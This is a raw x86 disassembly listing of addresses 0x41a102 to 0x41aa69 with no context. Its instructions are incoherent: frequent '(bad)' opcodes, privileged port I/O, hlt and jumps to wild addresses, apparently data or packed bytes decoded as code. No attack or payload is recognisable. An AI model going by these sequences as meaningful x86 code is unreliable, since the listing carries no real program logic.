  41a102:	add    eax,0x71615d35
  41a107:	push   es
  41a108:	(bad)  
  41a109:	clc    
  41a10a:	and    al,0xfb
  41a10c:	adc    eax,0x4015a1
  41a111:	(bad)  
  41a112:	dec    esp
  41a113:	stc    
  41a114:	pop    edi
  41a115:	jecxz  0x41a170
  41a117:	mov    dl,0x25
  41a11a:	add    eax,0x55514689
  41a11f:	cld    
  41a120:	adc    eax,0x4012fd
  41a125:	inc    al
  41a127:	test   BYTE PTR [esi],al
  41a129:	hlt    
  41a12a:	in     al,0xc6
  41a12c:	add    edi,DWORD PTR [ebp-0x5f]
  41a12f:	or     DWORD PTR [ecx+0x54d72e32],ecx
  41a135:	outs   dx,DWORD PTR ds:[esi]
  41a136:	cmp    esi,DWORD PTR [esi]
  41a138:	std    
  41a139:	mov    ebp,0x7f0ef771
  41a13e:	mov    al,ds:0xe620fd05
  41a143:	adc    DWORD PTR [ebx],0xffc17af8
	...
  41a161:	add    BYTE PTR [edx],dh
  41a163:	push   ebx
  41a164:	aas    
  41a165:	jb     0x41a14a
  41a167:	pop    es
  41a168:	test   DWORD PTR [ebx],0xff3a13dc
  41a16e:	ret    
  41a16f:	jmp    0x41a1b7
  41a171:	or     al,0x22
  41a173:	outs   dx,DWORD PTR ds:[esi]
  41a174:	adc    eax,0x1ae0614
  41a179:	pop    ebp
  41a17a:	dec    edx
  41a17b:	stos   DWORD PTR es:[edi],eax
  41a17c:	rcl    DWORD PTR [eax+0x4a],1
  41a17f:	repz jae 0x41a10d
  41a182:	xor    ah,BYTE PTR [edx-0x2f]
  41a185:	xchg   BYTE PTR [eax],bh
  41a187:	add    dl,BYTE PTR [eax]
  41a189:	std    
  41a18a:	loope  0x41a1f1
  41a18c:	adc    eax,DWORD PTR [eax-0xc]
  41a18f:	jp     0x41a1ed
  41a191:	aaa    
  41a192:	sbb    ah,BYTE PTR [esi-0xa]
  41a195:	push   ebx
  41a196:	leave  
  41a197:	jp     0x41a207
  41a199:	aaa    
  41a19a:	or     bl,BYTE PTR [eax]
  41a19c:	cmp    eax,0x8206f55
  41a1a1:	mov    DWORD PTR [ecx-0x15],ebx
  41a1a4:	aas    
  41a1a5:	mov    eax,0x6a2b11f4
  41a1aa:	hlt    
  41a1ab:	jle    0x41a1e5
  41a1ad:	mov    eax,0x111d5143
  41a1b2:	mov    ah,0x6d
  41a1b4:	xchg   al,al
  41a1b6:	jg     0x41a1d8
  41a1b8:	or     BYTE PTR [ebx+0x6],dh
  41a1bb:	add    eax,0x785c3866
  41a1c0:	hlt    
  41a1c1:	pop    es
  41a1c2:	add    eax,0x8ce6c5
	...
  41a1df:	mov    edx,0x4c286a00
  41a1e4:	add    eax,0x96d0952
  41a1e9:	jg     0x41a176
  41a1eb:	call   0x2d084c8c
  41a1f0:	daa    
  41a1f1:	mov    ecx,0x58e4946
  41a1f6:	lea    ebp,[ebp+0x75060845]
  41a1fc:	ds jmp 0x41a26a
  41a1ff:	mov    eax,ds:0x2f03e82e
  41a204:	js     0x41a281
  41a206:	daa    
  41a207:	in     al,dx
  41a208:	ja     0x41a1de
  41a20a:	pop    ds
  41a20b:	out    0xc4,al
  41a20d:	out    0xe1,al
  41a20f:	dec    esp
  41a210:	fisubr WORD PTR [ecx]
  41a212:	xlat   BYTE PTR ds:[ebx]
  41a213:	jl     0x41a27d
  41a215:	cmp    bl,dl
  41a217:	inc    esp
  41a218:	mov    ah,BYTE PTR [esi]
  41a21a:	adc    BYTE PTR [edx-0x2b],al
  41a21d:	pop    edi
  41a21e:	(bad)  
  41a21f:	mov    esi,DWORD PTR [edi-0xc]
  41a222:	sbb    esp,esi
  41a224:	(bad)  
  41a225:	out    0x34,al
  41a227:	popf   
  41a228:	cmp    eax,0x81e90c1e
  41a22d:	gs add esi,esp
  41a230:	add    al,0xf0
  41a232:	fdivp  st(7),st
  41a234:	pop    es
  41a235:	imul   eax,DWORD PTR [esi-0x7318fb0c],0xffffffe9
  41a23c:	mov    DWORD PTR [esi],ebx
  41a23e:	or     BYTE PTR [edi+0x8],bh
  41a241:	pop    esp
  41a242:	pop    es
	...
  41a25b:	add    ah,dh
  41a25d:	add    al,0xe7
  41a25f:	mov    al,bh
  41a261:	js     0x41a1f2
  41a263:	out    0x1,eax
  41a265:	push   es
  41a266:	add    cl,ch
  41a268:	jnp    0x41a2ae
  41a26a:	je     0x41a268
  41a26c:	inc    eax
  41a26d:	in     eax,dx
  41a26e:	add    esp,DWORD PTR [esi+0x2a]
  41a271:	pop    es
  41a272:	std    
  41a273:	aam    0xeb
  41a275:	jns    0x41a2ea
  41a277:	loope  0x41a2a1
  41a279:	js     0x41a28e
  41a27b:	ins    DWORD PTR es:[edi],dx
  41a27c:	loope  0x41a242
  41a27e:	push   DWORD PTR [ecx-0x79]
  41a281:	cmp    eax,0x2fc7b5f1
  41a286:	pop    ebx
  41a287:	fucomp st(3)
  41a289:	cmp    al,0x6a
  41a28b:	jmp    0x41a24d
  41a28d:	aad    0xfc
  41a28f:	pushf  
  41a290:	or     ebp,ebx
  41a292:	cld    
  41a293:	mov    bh,0xc9
  41a295:	jns    0x41a294
  41a297:	cld    
  41a298:	add    DWORD PTR [esi],0x40
  41a29b:	jmp    0xcdb4e812
  41a2a0:	je     0x41a2b4
  41a2a2:	or     al,0xda
  41a2a4:	mov    bh,0x76
  41a2a6:	dec    ebp
  41a2a7:	lahf   
  41a2a8:	je     0x41a2bc
  41a2aa:	clc    
  41a2ab:	fnstenv [edi-0x219ac8a]
  41a2b1:	add    BYTE PTR [ecx],dl
  41a2b3:	sub    eax,esi
  41a2b5:	mov    ecx,DWORD PTR ds:0xbf7a8d62
  41a2bb:	enter  0x6cf6,0xa
  41a2bf:	inc    DWORD PTR [eax]
	...
  41a2d9:	clc    
  41a2da:	add    al,0xe9
  41a2dc:	aam    0x6e
  41a2de:	add    BYTE PTR [ecx+0x78c7424],cl
  41a2e4:	pusha  
  41a2e5:	sub    al,0xf6
  41a2e7:	cld    
  41a2e8:	out    dx,al
  41a2e9:	dec    ecx
  41a2ea:	jns    0x41a2ff
  41a2ec:	imul   eax,DWORD PTR [esi],0xf959ffc5
  41a2f2:	ja     0x41a367
  41a2f4:	xchg   ecx,eax
  41a2f5:	retf   
  41a2f6:	adc    DWORD PTR [eax+eax*1],ebx
  41a2f9:	pop    ds
  41a2fa:	inc    edx
  41a2fb:	std    
  41a2fc:	pop    ebp
  41a2fd:	mov    ecx,0x115fc956
  41a303:	add    BYTE PTR [ecx+0xe],dl
  41a306:	mov    bl,BYTE PTR [ecx]
  41a308:	sbb    BYTE PTR [edi],bl
  41a30a:	inc    edx
  41a30b:	std    
  41a30c:	push   esp
  41a30d:	bound  edx,QWORD PTR [ebp-0x8adf382]
  41a313:	into   
  41a314:	call   DWORD PTR [ebx+0xa]
  41a317:	push   ebx
  41a318:	jmp    DWORD PTR [eax]
  41a31a:	push   ss
  41a31b:	adc    al,BYTE PTR [eax+0xd]
  41a31e:	xor    ebp,ecx
  41a320:	(bad)  
  41a321:	mov    eax,ds:0xe4010b1d
  41a326:	daa    
  41a327:	jbe    0x41a359
  41a329:	jmp    WORD PTR [esi]
  41a32c:	lds    ecx,FWORD PTR [esi-0x7]
  41a32f:	aas    
  41a330:	jb     0x41a310
  41a332:	imul   edi,DWORD PTR ds:0x1475658,0x6a
  41a339:	cli    
  41a33a:	push   0xfffffffe
  41a33c:	mov    WORD PTR [eax],es
	...
  41a356:	leave  
  41a357:	test   al,0x4d
  41a359:	push   eax
  41a35a:	stos   BYTE PTR es:[edi],al
  41a35b:	sbb    al,0xfc
  41a35d:	adc    BYTE PTR [ebp+0x1],bl
  41a360:	add    eax,0xc57f0840
  41a366:	int    0x39
  41a368:	cs jb  0x41a3bd
  41a36b:	jmp    0xb:0x2cd1c600
  41a372:	loop   0x41a369
  41a374:	into   
  41a375:	dec    ebx
  41a377:	or     BYTE PTR [ebx-0x1],dl
  41a37a:	push   eax
  41a37b:	adc    eax,0x8b5d4012
  41a380:	inc    esp
  41a381:	and    al,0x6a
  41a383:	push   esi
  41a384:	pop    edx
  41a385:	pop    ebx
  41a386:	mov    ah,0xc1
  41a388:	cli    
  41a389:	xor    eax,0x414d63f4
  41a38e:	hlt    
  41a38f:	sub    DWORD PTR [ebx],0x36
  41a392:	cmc    
  41a393:	imul   esi,DWORD PTR [edx],0xffffffc0
  41a396:	xchg   edi,eax
  41a397:	jae    0x41a3e6
  41a399:	inc    ecx
  41a39a:	hlt    
  41a39b:	retf   0xcc0c
  41a39e:	mov    bh,0x6b
  41a3a0:	mov    ds:0x1aa3014,al
  41a3a5:	rol    ecx,0xf2
  41a3a8:	ins    BYTE PTR es:[edi],dx
  41a3a9:	and    DWORD PTR [eax],0x144b8b07
  41a3af:	loop   0x41a380
  41a3b1:	pop    es
  41a3b2:	ins    DWORD PTR es:[edi],dx
  41a3b3:	mov    al,0x65
  41a3b5:	mov    DWORD PTR [ecx+0x4b8c67],ebp
	...
  41a3d3:	fsubr  st(7),st
  41a3d5:	iret   
  41a3d6:	(bad)  
  41a3d8:	xchg   ecx,eax
  41a3d9:	ins    DWORD PTR es:[edi],dx
  41a3da:	sub    DWORD PTR [ebp+ebx*2-0x7347b470],0x3fb04346
  41a3e5:	daa    
  41a3e6:	xchg   DWORD PTR [ecx],esi
  41a3e8:	push   ss
  41a3e9:	imul   ebp,DWORD PTR [ebx+ebx*1],0xb6c7015d
  41a3f0:	bound  eax,QWORD PTR [ecx]
  41a3f2:	push   ebx
  41a3f3:	jg     0x41a3ff
  41a3f5:	sub    ah,0x0
  41a3f8:	(bad)  
  41a3fa:	out    dx,eax
  41a3fb:	hlt    
  41a3fc:	fdivp  st(4),st
  41a3fe:	or     ebp,esp
  41a400:	cmp    edx,ebx
  41a402:	mov    BYTE PTR [ecx],dl
  41a404:	inc    bx
  41a406:	inc    ebx
  41a407:	mov    ebx,DWORD PTR [esi-0xa]
  41a40a:	sbb    al,0x6f
  41a40c:	and    edx,DWORD PTR [eax]
  41a40e:	adc    DWORD PTR [ecx],0x34830446
  41a414:	xor    bl,BYTE PTR [eax]
  41a416:	mov    DWORD PTR [ebx+0x5c738865],edi
  41a41c:	add    eax,0x300b4067
  41a421:	adc    ecx,DWORD PTR [ecx+edx*2]
  41a424:	retf   0x3b8e
  41a427:	mov    bh,0x6c
  41a429:	sbb    DWORD PTR [ebp+0x6d],ebp
  41a42c:	cli    
  41a42d:	(bad)  
  41a42e:	mov    ah,BYTE PTR [edi+0x7a6a78]
  41a434:	add    al,0x69
  41a436:	sldt   WORD PTR [eax]
	...
  41a44d:	add    BYTE PTR [eax],al
  41a44f:	add    BYTE PTR [ebx],ch
  41a451:	je     0x41a43a
  41a453:	mov    dl,bh
  41a455:	xchg   DWORD PTR [edi+0x10],ebx
  41a458:	jmp    0xf445f8e3
  41a45d:	add    al,0x12
  41a45f:	mov    DWORD PTR [edi],0xf4706604
  41a465:	add    al,0xe7
  41a467:	mov    BYTE PTR [edx-0x309bf8],ch
  41a46d:	add    ebp,DWORD PTR [ebx+0x4d]
  41a470:	hlt    
  41a471:	add    al,0xe7
  41a473:	je     0x41a418
  41a475:	add    al,0xe7
  41a477:	add    esi,DWORD PTR [ebx+eax*1+0x4f44163]
  41a47e:	out    0x83,eax
  41a480:	dec    edi
  41a481:	je     0x41a46a
  41a483:	imul   edi
  41a485:	jnp    0x41a4af
  41a487:	add    al,0xf4
  41a489:	add    al,0xa7
  41a48b:	or     al,0x78
  41a48d:	mov    ch,0xe7
  41a48f:	add    esi,esp
  41a491:	jg     0x41a4ab
  41a493:	adc    DWORD PTR [esi+0x7403e704],0xfffffff8
  41a49a:	jmp    0x62b6dc1b
  41a49f:	(bad)  
  41a4a0:	(bad)  
  41a4a1:	mov    esp,0xf93bcc52
  41a4a6:	add    ecx,esp
  41a4a8:	xor    edi,ecx
  41a4aa:	test   DWORD PTR [eax+0x3d00085c],0xe1e8861c
	...
  41a4cc:	add    BYTE PTR [ebx+0x18],ch
  41a4cf:	adc    DWORD PTR [ecx+0x65830207],0x480004f7
  41a4d9:	out    0x40,eax
  41a4db:	inc    ecx
  41a4dc:	jmp    0xfc496fdd
  41a4e1:	cmp    eax,0x2792d286
  41a4e6:	jl     0x41a52d
  41a4e8:	fnstcw WORD PTR [ecx+eax*8+0x13]
  41a4ec:	sbb    dh,0x7d
  41a4ef:	inc    ebp
  41a4f0:	icebp  
  41a4f1:	ins    BYTE PTR es:[edi],dx
  41a4f2:	mov    edi,0x7dc652f7
  41a4f7:	inc    ecx
  41a4f8:	or     eax,0x4227bd7d
  41a4fd:	into   
  41a4fe:	jge    0x41a541
  41a500:	fldcw  WORD PTR [ebp+edi*4+0x13]
  41a504:	push   edx
  41a505:	push   ss
  41a506:	jg     0x41a549
  41a508:	shl    DWORD PTR [ebx+0x45],1
  41a50b:	jae    0x41a4ee
  41a50d:	push   0xf7f900b2
  41a512:	add    al,0x73
  41a514:	in     eax,dx
  41a515:	adc    esi,DWORD PTR [edx+0x74]
  41a518:	stos   BYTE PTR es:[edi],al
  41a519:	inc    eax
  41a51a:	mov    dl,0x0
  41a51c:	leave  
  41a51d:	test   DWORD PTR [esp+esi*2],0x7c46cc2
  41a524:	jb     0x41a4e2
  41a526:	dec    BYTE PTR [eax+0xc6f74df]
  41a52c:	jne    0x41a504
  41a52e:	cmp    edx,0xfffffffd
	...
  41a549:	add    BYTE PTR [ebp+0x4ab812b],ah
  41a54f:	cmp    dl,BYTE PTR [esi-0x7]
  41a552:	test   BYTE PTR [ebx],dl
  41a554:	dec    edi
  41a555:	cmp    DWORD PTR [ebp-0x35],ebp
  41a558:	or     eax,DWORD PTR [eax]
  41a55a:	fnstsw WORD PTR [ecx]
  41a55c:	sti    
  41a55d:	call   0x417851
  41a562:	(bad)  
  41a563:	imul   eax,DWORD PTR ds:0xa718d85,0xfffffff7
  41a56a:	or     eax,DWORD PTR ds:0x865d0000
  41a570:	je     0x41a59d
  41a572:	fwait
  41a573:	inc    esp
  41a574:	cld    
  41a575:	add    esi,edx
  41a577:	push   es
  41a578:	and    eax,0xf009b945
  41a57d:	xor    DWORD PTR [eax],0xffffffe2
  41a580:	or     ecx,DWORD PTR [edi]
  41a582:	sahf   
  41a583:	or     bl,bh
  41a585:	call   DWORD PTR [edx+0xdff7988]
  41a58b:	jne    0x41a591
  41a58d:	xor    ebx,ebp
  41a58f:	das    
  41a590:	inc    ecx
  41a591:	lock sub BYTE PTR [ebx],cl
  41a594:	das    
  41a595:	ror    BYTE PTR [ebp+0x4f],0x5b
  41a599:	leave  
  41a59a:	iret   
  41a59b:	cld    
  41a59c:	push   DWORD PTR [ecx]
  41a59e:	sbb    eax,0x5655f5e2
  41a5a3:	fnstsw WORD PTR [esp+ebp*8-0x7b]
  41a5a7:	add    al,0x0
  41a5a9:	add    BYTE PTR [esi+0x8b5453],bl
	...
  41a5c7:	jo     0x41a5c6
  41a5c9:	xchg   BYTE PTR [edi-0x63],al
  41a5cc:	test   al,al
  41a5ce:	jne    0x41a5aa
  41a5d0:	aaa    
  41a5d1:	shr    cl,0x74
  41a5d4:	jno    0x41a5d3
  41a5d6:	inc    DWORD PTR [ebp-0x32fffffb]
  41a5dc:	pop    ebp
  41a5dd:	out    dx,eax
  41a5de:	push   ebp
  41a5df:	lea    eax,ds:0xdd308d50
  41a5e5:	out    0x88,eax
  41a5e7:	aas    
  41a5e8:	or     DWORD PTR [eax],eax
  41a5ea:	mov    esp,esi
  41a5ec:	and    BYTE PTR [eax+0x58d7b483],bh
  41a5f2:	cmp    ecx,0xb9870957
  41a5f8:	push   ebx
  41a5f9:	or     al,BYTE PTR [edx+0x15fb5]
  41a5ff:	dec    edi
  41a600:	pop    esi
  41a601:	mov    es,WORD PTR [ebx+0x4c]
  41a604:	test   BYTE PTR [eax],0x81
  41a607:	dec    ebp
  41a608:	jae    0x41a614
  41a60a:	add    BYTE PTR ds:0xff000160,0x10
  41a611:	push   0xfd53730d
  41a616:	push   DWORD PTR [ebx]
  41a618:	fiadd  WORD PTR [eax+0x8]
  41a61b:	(bad)  
  41a61c:	out    0x73,al
  41a61e:	adc    DWORD PTR [edx],0x8e1feb63
  41a624:	pop    ebx
  41a625:	mov    ss,esi
  41a627:	jg     0x41a65b
  41a629:	mov    WORD PTR [ebx+0x0],?
	...
  41a644:	adc    al,0xe4
  41a646:	mov    edi,0x7a090ce3
  41a64b:	std    
  41a64c:	sti    
  41a64d:	fiadd  WORD PTR [eax+0xd]
  41a650:	js     0x41a5db
  41a652:	push   es
  41a653:	add    ah,dh
  41a655:	ss lock jecxz 0x41a6c8
  41a659:	sbb    bl,ch
  41a65b:	dec    BYTE PTR [ebp+0x5e]
  41a65e:	imul   edx,DWORD PTR [eax],0x847a0fd2
  41a664:	mov    ah,0x67
  41a666:	jge    0x41a5f5
  41a668:	neg    DWORD PTR [ebp+0x1]
  41a66b:	std    
  41a66c:	inc    ecx
  41a66d:	add    cl,BYTE PTR [esi-0x14a3e12a]
  41a673:	call   DWORD PTR [ebx-0x5c028a8c]
  41a679:	jmp    0x560:0x5700d40
  41a680:	hlt    
  41a681:	add    al,0xde
  41a683:	out    dx,eax
  41a684:	xchg   edi,eax
  41a685:	jl     0x41a644
  41a687:	out    dx,al
  41a688:	neg    edx
  41a68a:	out    0x6b,al
  41a68c:	nop
  41a68d:	jb     0x41a655
  41a68f:	jns    0x41a709
  41a691:	inc    ebp
  41a692:	out    dx,al
  41a693:	jg     0x41a66a
  41a695:	add    esp,edi
  41a697:	add    ebp,DWORD PTR [ebp-0x30]
  41a69a:	fimul  DWORD PTR [ecx+esi*4+0x47bf6ffc]
  41a6a1:	mov    al,dl
  41a6a3:	sti    
  41a6a4:	cld    
  41a6a5:	aam    0x95
  41a6a7:	sldt   WORD PTR [eax]
	...
  41a6be:	add    BYTE PTR [eax],al
  41a6c0:	add    BYTE PTR [eax],bh
  41a6c2:	adc    esp,DWORD PTR [edi]
  41a6c4:	add    al,0x6d
  41a6c6:	dec    ebp
  41a6c7:	ins    BYTE PTR es:[edi],dx
  41a6c8:	pop    ebp
  41a6c9:	mov    dl,0x37
  41a6cb:	ins    BYTE PTR es:[edi],dx
  41a6cc:	mov    edi,0x3500d53b
  41a6d1:	or     al,0x8b
  41a6d3:	add    al,0x79
  41a6d5:	sbb    DWORD PTR [esp+esi*4+0x53],edi
  41a6d9:	jne    0x41a6c5
  41a6db:	sub    al,BYTE PTR [ebx+esi*2]
  41a6de:	ret    0xd32a
  41a6e1:	ins    BYTE PTR es:[edi],dx
  41a6e2:	cmp    eax,0x53bbf25
  41a6e7:	jo     0x41a6a8
  41a6e9:	mov    ebx,0xe8e80b5c
  41a6ee:	outs   dx,DWORD PTR ds:[esi]
  41a6ef:	imul   eax,DWORD PTR [ecx+esi*8-0x77],0x2b
  41a6f4:	add    al,0xf4
  41a6f6:	add    al,0x74
  41a6f8:	out    dx,eax
  41a6f9:	xchg   ebx,eax
  41a6fa:	pop    esp
  41a6fb:	out    0xe7,eax
  41a6fd:	enter  0x626f,0xef
  41a701:	mov    ds:0xb25fac7b,eax
  41a706:	leave  
  41a707:	add    DWORD PTR [edx+edi*4],eax
  41a70a:	leave  
  41a70b:	stc    
  41a70c:	add    esi,DWORD PTR [ebx-0x7]
  41a70f:	(bad)  
  41a710:	cld    
  41a711:	js     0x41a781
  41a713:	or     al,0xde
  41a715:	jno    0x41a73a
  41a717:	add    ch,cl
  41a719:	idiv   DWORD PTR [ebp+0x1]
  41a71c:	push   0xf
  41a71e:	add    DWORD PTR ds:0x2e16b,ecx
  41a724:	jmp    0x41a729
	...
  41a73d:	add    BYTE PTR [eax+0x74f6f3c3],bh
  41a743:	inc    DWORD PTR [ecx]
  41a745:	jmp    0xed8b2541
  41a74a:	in     al,0xaf
  41a74c:	add    cl,ch
  41a74e:	mul    DWORD PTR [ecx*1-0x2903993]
  41a755:	jmp    0xe64e13ca
  41a75a:	jne    0x41a7b8
  41a75c:	(bad)  
  41a75d:	call   0xe9011e59
  41a762:	cld    
  41a763:	mov    ch,bl
  41a765:	call   0x2ecbac61
  41a76a:	add    BYTE PTR [ecx+0x79eff4c0],cl
  41a770:	mov    edi,0x4e7e9
  41a775:	aam    0xfb
  41a777:	xor    bh,bh
  41a779:	in     eax,0x82
  41a77b:	cmp    al,0xff
  41a77d:	call   0xea012179
  41a782:	pop    ss
  41a783:	add    eax,0xb16bee00
  41a788:	(bad)  
  41a789:	call   0x3abd2c85
  41a78e:	idiv   edi
  41a790:	sbb    BYTE PTR [edi],0xf7
  41a793:	add    al,0x0
  41a795:	xchg   ebx,eax
  41a796:	lock iret 
  41a798:	mov    bl,BYTE PTR [ebp+ecx*4+0x6b]
  41a79c:	std    
  41a79d:	push   cs
  41a79e:	dec    edi
  41a79f:	ja     0x41a783
	...
  41a7b9:	add    BYTE PTR [eax],al
  41a7bb:	cli    
  41a7bc:	in     al,dx
  41a7bd:	xchg   al,dh
  41a7bf:	add    eax,0x8d016d14
  41a7c4:	ss add al,0x73
  41a7c7:	mov    fs,WORD PTR [eax-0x1]
  41a7ca:	pop    esi
  41a7cb:	or     bh,ch
  41a7cd:	rol    DWORD PTR [ecx],1
  41a7cf:	popf   
  41a7d0:	add    ch,BYTE PTR [edx+0x14]
  41a7d3:	mov    ebp,0x608cfd5a
  41a7d8:	popa   
  41a7d9:	cld    
  41a7da:	(bad)  
  41a7db:	cmp    al,BYTE PTR [edx-0x69ba0038]
  41a7e1:	sbb    BYTE PTR [ecx],al
  41a7e3:	dec    ebp
  41a7e4:	test   eax,eax
  41a7e6:	btc    DWORD PTR [edx-0x7ca30000],ecx
  41a7ed:	sti    
  41a7ee:	add    ah,al
  41a7f0:	mov    dh,BYTE PTR ds:[ebp-0x509f3]
  41a7f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7f8:	sahf   
  41a7f9:	add    BYTE PTR [eax],al
  41a7fb:	sbb    eax,0x1db8f2da
  41a800:	add    cl,BYTE PTR [ecx-0x50a0a7b]
  41a806:	(bad)  
  41a807:	std    
  41a808:	jns    0x41a7d0
  41a80a:	push   eax
  41a80b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a80c:	fs push eax
  41a80e:	jmp    DWORD PTR [eax]
  41a810:	ficom  WORD PTR [ebp-0x1]
  41a813:	add    BYTE PTR [esi],ch
  41a815:	adc    al,BYTE PTR [eax+0xd]
  41a818:	push   edx
  41a819:	or     BYTE PTR [di-0x3186],dl
  41a81e:	call   0x41a823
	...
  41a837:	add    dh,al
  41a839:	cmc    
  41a83a:	cli    
  41a83b:	call   DWORD PTR [ecx-0x37]
  41a83e:	jo     0x41a853
  41a840:	cmp    BYTE PTR [ebp+edi*4-0x18],al
  41a844:	and    eax,0x46fffc5a
  41a849:	stc    
  41a84a:	xor    dh,0xf4
  41a84d:	nop
  41a84e:	pop    ecx
  41a84f:	out    0xc5,eax
  41a851:	std    
  41a852:	je     0x41a851
  41a854:	xor    eax,0x91a5e840
  41a85a:	jbe    0x41a859
  41a85c:	lea    ebx,[edi+edi*8-0x1]
  41a860:	hlt    
  41a861:	fidiv  DWORD PTR [ecx+eax*1+0x9]
  41a865:	add    eax,DWORD PTR [edi+0x764d50b3]
  41a86b:	std    
  41a86c:	cmp    al,0x8e
  41a86e:	add    DWORD PTR [eax],eax
  41a870:	hlt    
  41a871:	inc    ebx
  41a872:	xchg   ebp,eax
  41a873:	mov    eax,0x83885bf4
  41a878:	fsubr  QWORD PTR [esi-0x1d3b028a]
  41a87e:	cmp    ch,cl
  41a880:	xchg   edi,eax
  41a881:	sar    BYTE PTR [edi+0x68],1
  41a884:	push   ebx
  41a885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a886:	jbe    0x41a8d8
  41a888:	dec    ebx
  41a889:	sbb    BYTE PTR [ebx+ecx*4],cl
  41a88c:	jns    0x41a885
  41a88e:	je     0x41a88d
  41a890:	cmp    ebp,DWORD PTR [ebx]
  41a892:	ins    BYTE PTR es:[edi],dx
  41a893:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a895:	pop    ebx
  41a896:	add    DWORD PTR [ebx-0x3f6fa1cc],eax
	...
  41a8b4:	add    BYTE PTR [eax-0x65],bh
  41a8b7:	lock push es
  41a8b9:	out    0x9b,eax
  41a8bb:	fild   DWORD PTR [esi-0x28a7887]
  41a8c1:	or     esp,DWORD PTR [ebx+eiz*2-0x77a4fc01]
  41a8c8:	or     DWORD PTR [edx-0x2f],0x75
  41a8cc:	std    
  41a8cd:	mov    edx,0x3d40015e
  41a8d2:	mov    cl,0x7c
  41a8d4:	(bad)  
  41a8d5:	cmp    DWORD PTR [edi],ebp
  41a8d7:	add    al,0x89
  41a8d9:	neg    esi
  41a8db:	push   0x7405240c
  41a8e0:	ret    0xd4ff
  41a8e3:	imul   edi,eax,0x73
  41a8e6:	cmp    BYTE PTR [edi],ah
  41a8e8:	imul   ecx,DWORD PTR [esi],0xffffffcc
  41a8eb:	out    0x3,eax
  41a8ed:	js     0x41a934
  41a8ef:	idiv   BYTE PTR [edi+0x70]
  41a8f2:	push   es
  41a8f3:	out    0x3,eax
  41a8f5:	in     eax,0x6b
  41a8f7:	mov    BYTE PTR fs:[eax-0x3a8a1195],ah
  41a8fe:	jb     0x41a971
  41a900:	rol    dh,0x94
  41a903:	iret   
  41a904:	adc    bl,ch
  41a906:	add    eax,0x4674bde7
  41a90b:	jecxz  0x41a88d
  41a90d:	jb     0x41a924
  41a90f:	cmp    DWORD PTR [esi+0x25],esp
  41a912:	inc    ebp
  41a913:	inc    ebp
  41a914:	mov    esp,DWORD PTR [ebx+0x79]
  41a917:	and    al,0x58
	...
  41a931:	add    BYTE PTR [ebx+0x7ecce7de],ch
  41a937:	jp     0x41a8bc
  41a939:	js     0x41a984
  41a93b:	ins    BYTE PTR es:[edi],dx
  41a93c:	pop    edi
  41a93d:	add    esi,esp
  41a93f:	add    al,0x67
  41a941:	shr    DWORD PTR [ebx-0x7a3dbbd],cl
  41a947:	add    al,0xe7
  41a949:	add    esi,DWORD PTR [ebx-0x3e]
  41a94c:	call   0xd80f:0x766c3281
  41a953:	adc    al,0x27
  41a955:	add    al,0x77
  41a957:	inc    ebp
  41a958:	fmul   st(1),st
  41a95a:	jle    0x41a91e
  41a95c:	ds aam 0x6e
  41a95f:	ret    0xd48e
  41a962:	mov    al,ds:0xe87f5bd3
  41a967:	push   0x46
  41a969:	jne    0x41a9af
  41a96b:	ins    BYTE PTR es:[edi],dx
  41a96c:	mov    ah,0x57
  41a96e:	loope  0x41a981
  41a970:	add    cl,dh
  41a972:	pop    es
  41a973:	vcvtsd2si esp,xmm3
  41a977:	dec    edi
  41a978:	sub    DWORD PTR [ecx],0xfffffff1
  41a97b:	shl    BYTE PTR [edx+0x41],0x49
  41a97f:	sbb    BYTE PTR [ecx+edi*8],bl
  41a982:	mov    bh,0x6b
  41a984:	or     BYTE PTR [edi],0xf4
  41a987:	neg    DWORD PTR [ebx]
  41a989:	shr    BYTE PTR [ebx+eax*1+0x6bf7650d],0xfd
  41a991:	jmp    0xe8b27ca5
	...
  41a9ae:	add    bh,dh
  41a9b0:	jge    0x41a9fb
  41a9b2:	icebp  
  41a9b3:	hlt    
  41a9b4:	mov    edi,0xfa3022b7
  41a9b9:	test   bh,al
  41a9bb:	test   DWORD PTR [eax+eax*1],0x89036a62
  41a9c2:	cmp    al,0xd0
  41a9c4:	inc    edx
  41a9c5:	inc    ebx
  41a9c6:	ret    0x7df6
  41a9c9:	add    DWORD PTR [eax],eax
  41a9cb:	fwait
  41a9cc:	ja     0x41a9cf
  41a9ce:	xchg   ecx,eax
  41a9cf:	je     0x41a9c0
  41a9d1:	repz cmc 
  41a9d3:	lock test ecx,ebx
  41a9d6:	pushf  
  41a9d7:	enter  0x8969,0x2c
  41a9db:	enter  0xb4f9,0x29
  41a9df:	xor    ah,bl
  41a9e1:	(bad)  
  41a9e2:	call   0x7e916ede
  41a9e7:	adc    BYTE PTR [ebx],ch
  41a9e9:	mov    edx,DWORD PTR [esp+eax*8]
  41a9ec:	pop    esp
  41a9ed:	push   eax
  41a9ee:	push   cs
  41a9ef:	clc    
  41a9f0:	add    al,0x89
  41a9f2:	xor    DWORD PTR [esi-0x41],edi
  41a9f5:	fbld   TBYTE PTR [esi+ebp*4-0x7]
  41a9f9:	sbb    DWORD PTR [eax+0x620004f7],0xffffffca
  41aa00:	push   esi
  41aa01:	xor    DWORD PTR [eax],eax
  41aa03:	sbb    eax,0x46f4417f
  41aa08:	sti    
  41aa09:	xchg   BYTE PTR [ecx],dl
  41aa0b:	dec    esi
  41aa0c:	in     al,dx
  41aa0d:	add    eax,0xcf2dc372
  41aa12:	ja     0x41aa14
	...
  41aa2c:	neg    edx
  41aa2e:	cmp    al,0x4
  41aa30:	int3   
  41aa31:	pop    ebx
  41aa32:	or     BYTE PTR [ebx],ch
  41aa34:	pop    es
  41aa35:	add    eax,0x680683ca
  41aa3a:	jo     0x41aa22
  41aa3c:	push   es
  41aa3d:	dec    DWORD PTR [eax+0x417f9b41]
  41aa43:	hlt    
  41aa44:	adc    BYTE PTR [edi+esi*8-0x1],al
  41aa48:	or     dl,bl
  41aa4a:	cs leave 
  41aa4c:	aad    0x43
  41aa4e:	clc    
  41aa4f:	invd   
  41aa51:	rol    BYTE PTR [ebp+ecx*2+0x18c6c96d],0x5c
  41aa59:	push   es
  41aa5a:	push   esi
  41aa5b:	jmp    FWORD PTR [eax]
  41aa5d:	fld    QWORD PTR [ebp+eax*2+0x312ec979]
  41aa64:	dec    esp
  41aa65:	push   es
  41aa66:	xchg   DWORD PTR [ebp+0x3d],ecx
  41aa69:	call   0x44085ab6
